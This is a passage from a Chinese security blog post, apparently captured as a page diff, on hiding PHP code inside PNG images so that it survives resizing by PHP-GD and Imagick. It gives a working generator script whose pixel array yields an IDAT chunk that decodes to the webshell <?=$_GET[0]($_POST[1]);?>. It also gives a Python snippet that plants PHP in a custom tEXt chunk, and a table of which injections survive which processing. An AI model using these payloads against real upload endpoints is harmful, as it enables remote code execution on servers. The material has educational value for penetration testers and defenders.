class="variable">$form</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;suit&#x27;</span>)-&gt;<span class="title function_ invoke__">getData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从原始文件名生成唯一的文件名</span></span><br><span class="line">    <span class="variable">$originalFilename</span> = <span class="variable">$suitFile</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>();</span><br><span class="line">    <span class="variable">$newFilename</span> = <span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;_&#x27;</span>.<span class="variable">$originalFilename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># 压缩上传的PNG（gzip库的第9级），调整大小并保存</span></span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$suitFile</span>-&gt;<span class="title function_ invoke__">getPathName</span>();</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$width</span>, <span class="variable">$height</span>) = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$source</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$thumb</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">55</span>, <span class="number">55</span>);</span><br><span class="line">        <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$thumb</span>, <span class="variable">$source</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="variable">$width</span>, <span class="variable">$height</span>);</span><br><span class="line">        <span class="title function_ invoke__">imagepng</span>(<span class="variable">$thumb</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getParameter</span>(<span class="string">&#x27;thumbnails_directory&#x27;</span>).<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newFilename</span>);</span><br><span class="line">        <span class="variable">$suit</span>-&gt;<span class="title function_ invoke__">setSuitFilename</span>(<span class="variable">$newFilename</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;Exception in image processing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将“suit”对象存储在数据库中以在应用程序中显示</span></span><br><span class="line">    <span class="variable">$entityManager</span>-&gt;<span class="title function_ invoke__">persist</span>(<span class="variable">$suit</span>);</span><br><span class="line">    <span class="variable">$entityManager</span>-&gt;<span class="title function_ invoke__">flush</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirectToRoute</span>(<span class="string">&#x27;app_third_part&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法四-IDAT块注入"><a href="#方法四-IDAT块注入" class="headerlink" title="方法四 IDAT块注入"></a>方法四 IDAT块注入</h4><p>调整图像大小时，即使是 PLTE关键块的内容也会被破坏,我们的payload也会随之破坏。这些函数实际上只使用原始文件中的像素数据来创建一个全新的图像。关键数据块或辅助数据块中包含的数据都可能会被忽略。</p>
+<p>将PHP载荷注入PNG文件的一种相当复杂但有效的方法是将其编码为PNG的IDAT块。</p>
+<p>当将原始图像保存为PNG时，图像的每一行都按字节进行过滤，并且该行前缀有一个数字，该数字描述了所使用的过滤器类型（0x01到0x05），不同的行可以使用不同的过滤器。这背后的基本原理是提高压缩比。过滤完所有行后，它们都使用 DEFLATE 算法压缩以形成 IDAT 块。</p>
+<p><img src="https://www.idontplaydarts.com/images/flow1.png" alt="img"></p>
+<p>要生成一个包含有效PHP代码的IDAT 块，应该找到原始像素的精确组合，这些像素一旦被 PNG线过滤器和DEFLATE算法处理，就会输出所需的有效载荷。</p>
+<p>字符串不能包含任何重复的代码块，否则它们将被压缩。</p>
+<p>虽然很难，但确实是可以实现的。</p>
+<p>可以使用以下脚本来生成110x110的PNG图像，一旦调整为55x55，IDAT汇总将包含 PHP 代码：**<?=$_GET[0]($_POST[1]);?>**</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: image/png&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xA3</span>, <span class="number">0x9F</span>, <span class="number">0x67</span>, <span class="number">0xF7</span>, <span class="number">0x0E</span>, <span class="number">0x93</span>, <span class="number">0x1B</span>, <span class="number">0x23</span>, <span class="number">0xBE</span>, <span class="number">0x2C</span>, <span class="number">0x8A</span>, <span class="number">0xD0</span>, <span class="number">0x80</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0xAE</span>, <span class="number">0x22</span>, <span class="number">0xF6</span>, <span class="number">0xD9</span>, <span class="number">0x43</span>, <span class="number">0x5D</span>, <span class="number">0xFB</span>, <span class="number">0xAE</span>, <span class="number">0xCC</span>, <span class="number">0x5A</span>, <span class="number">0x01</span>, <span class="number">0xDC</span>, <span class="number">0xAA</span>, <span class="number">0x52</span>, <span class="number">0xD0</span>, <span class="number">0xB6</span>, <span class="number">0xEE</span>, <span class="number">0xBB</span>, <span class="number">0x3A</span>, <span class="number">0xCF</span>, <span class="number">0x93</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x88</span>, <span class="number">0xFC</span>, <span class="number">0x69</span>, <span class="number">0xD0</span>, <span class="number">0x2B</span>, <span class="number">0xB9</span>, <span class="number">0xB0</span>, <span class="number">0xFB</span>, <span class="number">0xBB</span>, <span class="number">0x79</span>, <span class="number">0xFC</span>, <span class="number">0xED</span>, <span class="number">0x22</span>, <span class="number">0x38</span>, <span class="number">0x49</span>, <span class="number">0xD3</span>, <span class="number">0x51</span>, <span class="number">0xB7</span>, <span class="number">0x3F</span>, <span class="number">0x02</span>, <span class="number">0xC2</span>, <span class="number">0x20</span>, <span class="number">0xD8</span>, <span class="number">0xD9</span>, <span class="number">0x3C</span>, <span class="number">0x67</span>, <span class="number">0xF4</span>, <span class="number">0x50</span>, <span class="number">0x67</span>, <span class="number">0xF4</span>, <span class="number">0x50</span>, <span class="number">0xA3</span>, <span class="number">0x9F</span>, <span class="number">0x67</span>, <span class="number">0xA5</span>, <span class="number">0xBE</span>, <span class="number">0x5F</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5A</span>, <span class="number">0x4C</span>, <span class="number">0xA1</span>, <span class="number">0x3F</span>, <span class="number">0x7A</span>, <span class="number">0xBF</span>, <span class="number">0x30</span>, <span class="number">0x6B</span>, <span class="number">0x88</span>, <span class="number">0x2D</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x52</span>, <span class="number">0x9D</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x94</span>, <span class="number">0xA1</span>, <span class="number">0x27</span>, <span class="number">0x56</span>, <span class="number">0xEC</span>, <span class="number">0xFE</span>, <span class="number">0xAF</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0xEB</span>, <span class="number">0x2E</span>, <span class="number">0x20</span>, <span class="number">0xA3</span>, <span class="number">0xAE</span>, <span class="number">0x58</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0x0C</span>, <span class="number">0x10</span>, <span class="number">0x55</span>, <span class="number">0xCF</span>, <span class="number">0x09</span>, <span class="number">0x5C</span>, <span class="number">0x10</span>, <span class="number">0x40</span>, <span class="number">0x8A</span>, <span class="number">0xB9</span>, <span class="number">0x39</span>, <span class="number">0xB3</span>, <span class="number">0xC8</span>, <span class="number">0xCD</span>, <span class="number">0x64</span>, <span class="number">0x45</span>, <span class="number">0x3C</span>, <span class="number">0x49</span>, <span class="number">0x3E</span>, <span class="number">0xAD</span>, <span class="number">0x3F</span>, <span class="number">0x33</span>, <span class="number">0x56</span>, <span class="number">0x1F</span>, <span class="number">0x19</span> );</span><br><span class="line"> </span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">55</span>, <span class="number">55</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line"><span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此脚本生成恶意 PNG 图像：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php generate_idat_png.php &gt; png-idat-inject.php</span><br></pre></td></tr></table></figure>
+
+<p>这时候将生成的图像通过&#x2F;third-part路由上传，就可以触发webshell。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633863.png" alt="image-20221118155953422"></p>
+<p>通过发送POST请求来触发php执行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633865.png" alt="image-20221118160225397"></p>
+<h3 id="IMAGICK库调整图像大小"><a href="#IMAGICK库调整图像大小" class="headerlink" title="IMAGICK库调整图像大小"></a><strong>IMAGICK</strong>库调整图像大小</h3><p>除了PHP-GD之外，最流行的图像处理库之一是Imagick，它是ImageMagick的PHP实现。&#x2F;fourth-part路由说明了一个应用程序，它使用thumbnailImage功能调整用户上传的文件的大小。此函数用于产生较小的low-cost缩略图图像，适合在Web上显示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建“suit”对象并将其链接到Symfony表单</span></span><br><span class="line"><span class="variable">$suit</span> = <span class="keyword">new</span> <span class="title class_">Suit</span>();</span><br><span class="line"><span class="variable">$form</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createForm</span>(<span class="title class_">SuitType</span>::<span class="variable language_">class</span>, <span class="variable">$suit</span>);</span><br><span class="line"><span class="variable">$form</span>-&gt;<span class="title function_ invoke__">handleRequest</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果用户定义了标题、描述并上传了JPG/PNG MIME类型的文件，则表单将提交并有效</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$form</span>-&gt;<span class="title function_ invoke__">isSubmitted</span>() &amp;&amp; <span class="variable">$form</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从表单中获取上传文件</span></span><br><span class="line">    <span class="variable">$suitFile</span> = <span class="variable">$form</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;suit&#x27;</span>)-&gt;<span class="title function_ invoke__">getData</span>();</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 从原始文件名生成唯一的文件名</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$suitFile</span>) &#123;</span><br><span class="line">        <span class="variable">$originalFilename</span> = <span class="variable">$suitFile</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>();</span><br><span class="line">        <span class="variable">$newFilename</span> = <span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;_&#x27;</span>.<span class="variable">$originalFilename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment"># 使用Imagick将文件转换为100x100缩略图</span></span><br><span class="line">            <span class="variable">$filename</span> = <span class="variable">$suitFile</span>-&gt;<span class="title function_ invoke__">getPathName</span>();</span><br><span class="line">            <span class="variable">$imgck</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$imgck</span>-&gt;<span class="title function_ invoke__">thumbnailImage</span>(<span class="number">55</span>, <span class="number">55</span>, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="variable">$imgck</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getParameter</span>(<span class="string">&#x27;thumbnails_directory&#x27;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$newFilename</span>);</span><br><span class="line">            <span class="variable">$suit</span>-&gt;<span class="title function_ invoke__">setSuitFilename</span>(<span class="variable">$newFilename</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> New <span class="title function_ invoke__">Response</span>(<span class="string">&quot;Exception in image processing&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#将“suit”对象存储在数据库中以在应用程序中显示</span></span><br><span class="line">    <span class="variable">$entityManager</span>-&gt;<span class="title function_ invoke__">persist</span>(<span class="variable">$suit</span>);</span><br><span class="line">    <span class="variable">$entityManager</span>-&gt;<span class="title function_ invoke__">flush</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirectToRoute</span>(<span class="string">&#x27;app_fourth_part&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法五-自定义文本块注入"><a href="#方法五-自定义文本块注入" class="headerlink" title="方法五 自定义文本块注入"></a>方法五 自定义文本块注入</h4><p>当Imagick调整图像大小时，它实际上会对文本块执行几个操作：</p>
+<ul>
+<li>擦除标记为“Comment”的tEXt块。</li>
+<li>覆盖以下tEXt块的值（或者如果它们不存在则定义它们）：<code>date:create, date:modify, software, Thumb::Document::Pages, Thumb::Image::Height, Thumb::Image::Width, Thumb::Mimetype, Thumb::MTime, Thumb::Size, Thumb::URI</code>。</li>
+<li>保留任何其他tEXt块的原始值（包括不存在预定义关键字的tEXt块）。</li>
+</ul>
+<p>在方法二的PNG注释中，我们已经知道了预定义的tEXt块的预定义关键字有如下这些：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633859.png" alt="image-20221117091517048"></p>
+<p>因为我们修改的是copyright块，所以是可以绕过thumbnailImage方法的处理的。</p>
+<p>使用方法二的图像，可以成功执行。如下图，可以看到它并不是紧跟在tEXt块后面执行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633866.png" alt="image-20221118161847921"></p>
+<p>除了以上预定义关键字，我们还可以自定义关键字。通过以下简单的python代码可以实现。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : ordar</span></span><br><span class="line"><span class="comment"># @Python: 3.7.5</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PngImagePlugin <span class="keyword">import</span> PngInfo</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;png/png.png&quot;</span>)</span><br><span class="line">p = PngInfo()</span><br><span class="line"><span class="comment"># PngInfo类有两个方法add_itxt和add_text，这两个方法实现的效果是一样的。</span></span><br><span class="line"><span class="comment"># iTXt是国际文本数据；iEXt是文本信息数据块</span></span><br><span class="line"><span class="comment"># p.add_itxt(b&quot;Aaaaa&quot;, b&quot;&lt;?php phpinfo(); ?&gt;&quot;)</span></span><br><span class="line">p.add_text(<span class="string">b&quot;Aaaaa&quot;</span>, <span class="string">b&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)</span><br><span class="line">im.save(<span class="string">&quot;png/png-text-custom.png&quot;</span>,pnginfo=p)</span><br></pre></td></tr></table></figure>
+
+<p>用exiftool工具查看图片信息，可以发现Aaaaa文本信息成功添加进去了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633867.png" alt="image-20221118162603942"></p>
+<p>当然也可以解析执行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MrWQ/vulnerability-test-img/img/202304201633868.png" alt="image-20221118162808227"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当服务器可以将图像文件解释为PHP时，例如弱扩展检查、解析漏洞、本地文件包含漏洞、错误配置PHP解析扩展等方式，可以使用这些技术来造成代码执行。</p>
+<table>
+<thead>
+<tr>
+<th align="left"></th>
+<th align="center">不处理图像</th>
+<th align="center">PHP-GD 压缩图像</th>
+<th align="center">PHP-GD调整图像大小</th>
+<th align="center">Imagick调整图像大小</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">直接拼接</td>
+<td align="center">可以解析</td>
+<td align="center">不可以</td>
+<td align="center">不可以</td>
+<td align="center">不可以</td>
+</tr>
+<tr>
+<td align="left">预定义文本块注入</td>
+<td align="center">可以解析</td>
+<td align="center">不可以</td>
+<td align="center">不可以</td>
+<td align="center">部分预定义的关键字可以解析</td>
+</tr>
+<tr>
+<td align="left">PLTE块注入</td>
+<td align="center">可以解析</td>
+<td align="center">可以解析</td>
+<td align="center">不可以</td>
+<td align="center">不可以</td>
+</tr>
+<tr>
+<td align="left">IDAT块注入</td>
+<td align="center">可以解析</td>
+<td align="center">可以解析</td>
+<td align="center">可以解析</td>
+<td align="center">可以解析</td>
+</tr>
+<tr>
+<td align="left">自定义文本块注入</td>
+<td align="center">可以解析</td>
+<td align="center">不可以</td>
+<td align="center">不可以</td>
+<td align="center">可以解析</td>
+</tr>
+</tbody></table>
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/alipay.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/weixin.png">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          ordar
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://mrwq.github.io/在PNG中注入PHP代码/" title="在PNG中注入PHP代码" target="_blank">https://mrwq.github.io/在PNG中注入PHP代码/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本文作者： ordar123 转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -289,207 +645,129 @@
 		</ul>
 	</div>
 
-          
+    
 
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://mrwq.github.io/%E5%9C%A8PNG%E4%B8%AD%E6%B3%A8%E5%85%A5PHP%E4%BB%A3%E7%A0%81/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9AT+%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%880day%EF%BC%89%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-        <time datetime="2022-08-30T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-30</time>
-</a>
 
+
+<nav id="article-nav">
+  
+    <a href="/AMSI%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          AMSI绕过原理与实践
+        
+      </div>
+    </a>
+  
+  
+    <a href="/%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9AT+%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%880day%EF%BC%89%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">用友畅捷通T+未授权任意文件上传漏洞（0day）分析与复现</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9AT+%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%880day%EF%BC%89%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">用友畅捷通T+未授权任意文件上传漏洞（0day）分析与复现</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">0day</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PNG%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">PNG结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%95%B0%E6%8D%AE%E5%9D%97"><span class="toc-number">2.1.</span> <span class="toc-text">关键数据块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E6%95%B0%E6%8D%AE%E5%9D%97"><span class="toc-number">2.2.</span> <span class="toc-text">辅助数据块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8PNG%E4%B8%AD%E6%B3%A8%E5%85%A5PHP%E4%BB%A3%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">在PNG中注入PHP代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#first-part-%E7%AE%80%E5%8D%95%E6%8F%92%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">first-part 简单插入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E7%9B%B4%E6%8E%A5%E6%8B%BC%E6%8E%A5"><span class="toc-number">3.1.1.</span> <span class="toc-text">方法一 直接拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E9%A2%84%E5%AE%9A%E4%B9%89%E6%96%87%E6%9C%AC%E5%9D%97%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.2.</span> <span class="toc-text">方法二 预定义文本块注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-GD%E5%BA%93%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%9B%BE%E5%83%8F"><span class="toc-number">3.2.</span> <span class="toc-text">PHP-GD库的压缩图像</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-PLTE%E5%9D%97%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.1.</span> <span class="toc-text">方法三 PLTE块注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-GD%E5%BA%93%E8%B0%83%E6%95%B4%E5%9B%BE%E5%83%8F%E5%A4%A7%E5%B0%8F"><span class="toc-number">3.3.</span> <span class="toc-text">PHP-GD库调整图像大小</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 